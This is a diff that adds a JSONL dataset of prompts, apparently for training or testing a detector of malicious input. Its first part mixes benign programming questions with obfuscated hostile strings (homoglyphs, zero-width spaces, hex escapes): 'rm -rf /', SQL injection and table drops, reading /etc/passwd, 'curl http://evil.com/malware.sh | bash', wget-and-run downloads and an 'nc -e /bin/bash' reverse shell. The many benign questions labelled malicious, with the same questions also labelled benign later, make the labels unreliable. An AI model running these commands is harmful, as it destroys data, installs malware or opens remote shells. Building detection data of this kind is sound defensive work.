@@ -1,0 +1,433 @@
+{"text": "How do I handle errors in Python?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I handle errors in Python?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I sort an array in Java?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "еxec('import os; os.system(\"rm -rf /\")')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What are the benefits of using Docker?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the concept of dependency injection", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the concept of dependency injection", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain git merge vs rebase", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "DROP\\x20TABLE\\x20accounts;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I handle errors in Python?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "exec('import  os;  os.system(\"rm  -rf  /\")')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "DELETE  FROM  users;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Hello, how are you?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "python -c 'import subprocess; subprocess.cаll([\"rm\", \"-rf\", \"/tmp\"])'", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "AlTeR TABLE users DROP COLUMN password;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Hello, how are you?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "TRUNCATE​ TABLE logs;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "UNION SELECT null, null, null FROM informаtion_schema.tables", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I create a new branch in git?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "cаt /etc/passwd", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "wget http://evil.com/exploit -O /tmp/x %26%26 chmod +x /tmp/x %26%26 /tmp/x", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "UPDATE​ users SET password='hacked' WHERE id=1", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I create a new branch in git?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "cat\\x20/etc/passwd", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "UPDATE users SET password%3D'hacked' WHERE id%3D1", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "DELETE​ FROM users;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does caching improve performance?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I create a new branch in git?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "eXeC('import os; os.system(\"rm -rf /\")')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I sort an array in Java?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the concept of dependency injection", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you help me with Python programming?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does authentication work?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does caching improve performance?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What are the benefits of using Docker?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "TRUNCаTE TABLE logs;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I create a new branch in git?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the purpose of environment variables?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "evаl('malicious code')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain the MVC pattern?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the concept of dependency injection", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain git merge vs rebase", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "';\\x20DROP\\x20TABLE\\x20users;\\x20--", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the concept of dependency injection", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What are the benefits of using Docker?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I sort an array in Java?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain the MVC pattern?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you help me with Python programming?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "wgеt http://evil.com/exploit -O /tmp/x && chmod +x /tmp/x && /tmp/x", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain what is a database index?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does authentication work?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Hello, how are you?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "cat  /etc/passwd", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain what is a database index?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the difference between list and tuple in Python", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the purpose of environment variables?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain the MVC pattern?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "wget​ http://evil.com/exploit -O /tmp/x && chmod +x /tmp/x && /tmp/x", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "python​ -c 'import subprocess; subprocess.call([\"rm\", \"-rf\", \"/tmp\"])'", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "jаva.lang.Runtime.getRuntime().exec('rm -rf /')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the concept of dependency injection", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does caching improve performance?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the concept of dependency injection", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "eval('malicious  code')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I sort an array in Java?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I handle errors in Python?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "eval('malicious​ code')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the purpose of environment variables?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does caching improve performance?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What are the benefits of using Docker?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the difference between list and tuple in Python", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "DrOp TABLE accounts;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "UPDаTE users SET password='hacked' WHERE id=1", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "python\\x20-c\\x20'import\\x20subprocess;\\x20subprocess.call([\"rm\",\\x20\"-rf\",\\x20\"/tmp\"])'", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Hello, how are you?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "cAt /etc/passwd", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "UpDaTE users SET password='hacked' WHERE id=1", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "bAsH -c 'rm -rf /var/log'", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "rM -rf /tmp", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "SeLeCT * FROM users WHERE id=1 OR 1=1", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the concept of dependency injection", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I create a new branch in git?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does authentication work?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain git merge vs rebase", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain the MVC pattern?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the difference between list and tuple in Python", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "ALTER​ TABLE users DROP COLUMN password;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does authentication work?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I create a new branch in git?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the difference between list and tuple in Python", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain git merge vs rebase", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain what is a database index?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I create a new branch in git?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you help me with Python programming?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I handle errors in Python?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "java.lang.Runtime.getRuntime().exec('rm​ -rf /')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "';​ DROP TABLE users; --", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the purpose of environment variables?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain git merge vs rebase", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does authentication work?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain git merge vs rebase", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "rm\\x20-rf\\x20/tmp", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain the MVC pattern?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "cat​ /etc/passwd", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "DROP  TABLE  accounts;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "TrUnCATE TABLE logs;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "eval('malicious\\x20code')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I sort an array in Java?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "bash  -c  'rm  -rf  /var/log'", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "DROP​ TABLE accounts;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "INSERT​ INTO users VALUES ('admin', 'password')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does authentication work?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I handle errors in Python?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What are the benefits of using Docker?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain the MVC pattern?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "INSERT  INTO  users  VALUES  ('admin',  'password')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Hello, how are you?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does caching improve performance?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you help me with Python programming?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "UnIoN SELECT null, null, null FROM information_schema.tables", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain git merge vs rebase", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "nc\\x20-e\\x20/bin/bash\\x20attacker.com\\x204444", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "python  -c  'import  subprocess;  subprocess.call([\"rm\",  \"-rf\",  \"/tmp\"])'", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the difference between list and tuple in Python", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "wget  http://evil.com/exploit  -O  /tmp/x  &&  chmod  +x  /tmp/x  &&  /tmp/x", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the difference between list and tuple in Python", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Hello, how are you?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "curl\\x20http://evil.com/malware.sh\\x20|\\x20bash", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the difference between list and tuple in Python", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I handle errors in Python?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the purpose of environment variables?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What are the benefits of using Docker?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you help me with Python programming?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "ALTER\\x20TABLE\\x20users\\x20DROP\\x20COLUMN\\x20password;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does authentication work?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "curl​ http://evil.com/malware.sh | bash", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I create a new branch in git?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain git merge vs rebase", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain what is a database index?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "bаsh -c 'rm -rf /var/log'", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What are the benefits of using Docker?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I handle errors in Python?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain git merge vs rebase", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the purpose of environment variables?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does authentication work?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "bash\\x20-c\\x20'rm\\x20-rf\\x20/var/log'", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What are the benefits of using Docker?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "';  DROP  TABLE  users;  --", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you help me with Python programming?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the concept of dependency injection", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "DELETE\\x20FROM\\x20users;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does authentication work?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "wGeT http://evil.com/exploit -O /tmp/x && chmod +x /tmp/x && /tmp/x", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "INSERT\\x20INTO\\x20users\\x20VALUES\\x20('admin',\\x20'password')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "cUrL http://evil.com/malware.sh | bash", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "ALTER  TABLE  users  DROP  COLUMN  password;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "InSeRT INTO users VALUES ('admin', 'password')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I sort an array in Java?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How do I sort an array in Java?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain what is a database index?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What are the benefits of using Docker?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "How does authentication work?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain the MVC pattern?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "аLTER TABLE users DROP COLUMN password;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "eVaL('malicious code')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "curl  http://evil.com/malware.sh  |  bash", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain git merge vs rebase", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you help me with Python programming?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "INSERT INTO users VаLUES ('admin', 'password')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Can you explain what is a database index?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "pYtHon -c 'import subprocess; subprocess.call([\"rm\", \"-rf\", \"/tmp\"])'", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain the concept of dependency injection", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm -rf /')", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Tell me about REST API best practices", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "UNION​ SELECT null, null, null FROM information_schema.tables", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "nc  -e  /bin/bash  attacker.com  4444", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Hello, how are you?", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "Explain git merge vs rebase", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "DROP TаBLE accounts;", "label": 1, "pattern": null, "category": "malicious", "metadata": {}}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9980834722518921, "keywords": ["synchronous", "asynchronous"]}
+{"text": "Hello, how are you?", "label": 0, "pattern": "technical_question", "category": "unknown", "subcategory": "unknown", "confidence": 0.9999504089355469, "keywords": []}
+{"text": "How does caching improve performance?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9992676377296448, "keywords": ["caching"]}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9997946619987488, "keywords": ["http", "https"]}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9890074729919434, "keywords": ["javascript", "java", "loop"]}
+{"text": "Explain the concept of dependency injection", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999993085861206, "keywords": ["dependency"]}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.997484564781189, "keywords": ["sql", "select"]}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.997484564781189, "keywords": ["sql", "select"]}
+{"text": "Can you explain what is a database index?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.7323171496391296, "keywords": ["database", "index"]}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9890074729919434, "keywords": ["javascript", "java", "loop"]}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.997484564781189, "keywords": ["sql", "select"]}
+{"text": "Explain git merge vs rebase", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9999232292175293, "keywords": ["git", "merge"]}
+{"text": "How do I handle errors in Python?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9995669722557068, "keywords": ["python", "error"]}
+{"text": "Explain the concept of dependency injection", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999993085861206, "keywords": ["dependency"]}
+{"text": "Hello, how are you?", "label": 0, "pattern": "technical_question", "category": "unknown", "subcategory": "unknown", "confidence": 0.9999504089355469, "keywords": []}
+{"text": "Tell me about REST API best practices", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999996542930603, "keywords": ["rest", "api"]}
+{"text": "Explain git merge vs rebase", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9999232292175293, "keywords": ["git", "merge"]}
+{"text": "How do I create a new branch in git?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9955427050590515, "keywords": ["git", "branch"]}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9980834722518921, "keywords": ["synchronous", "asynchronous"]}
+{"text": "How do I create a new branch in git?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9955427050590515, "keywords": ["git", "branch"]}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9980834722518921, "keywords": ["synchronous", "asynchronous"]}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9980834722518921, "keywords": ["synchronous", "asynchronous"]}
+{"text": "How do I handle errors in Python?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9995669722557068, "keywords": ["python", "error"]}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9997946619987488, "keywords": ["http", "https"]}
+{"text": "Explain the concept of dependency injection", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999993085861206, "keywords": ["dependency"]}
+{"text": "What are the benefits of using Docker?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984320998191833, "keywords": ["docker"]}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9997946619987488, "keywords": ["http", "https"]}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9980834722518921, "keywords": ["synchronous", "asynchronous"]}
+{"text": "How do I sort an array in Java?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9880051016807556, "keywords": ["java"]}
+{"text": "Can you explain the MVC pattern?", "label": 0, "pattern": "technical_question", "category": "best_practice_question", "subcategory": "general", "confidence": 0.9911192059516907, "keywords": []}
+{"text": "Can you explain the MVC pattern?", "label": 0, "pattern": "technical_question", "category": "best_practice_question", "subcategory": "general", "confidence": 0.9911192059516907, "keywords": []}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9946553707122803, "keywords": ["python"]}
+{"text": "Can you explain the MVC pattern?", "label": 0, "pattern": "technical_question", "category": "best_practice_question", "subcategory": "general", "confidence": 0.9911192059516907, "keywords": []}
+{"text": "How do I sort an array in Java?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9880051016807556, "keywords": ["java"]}
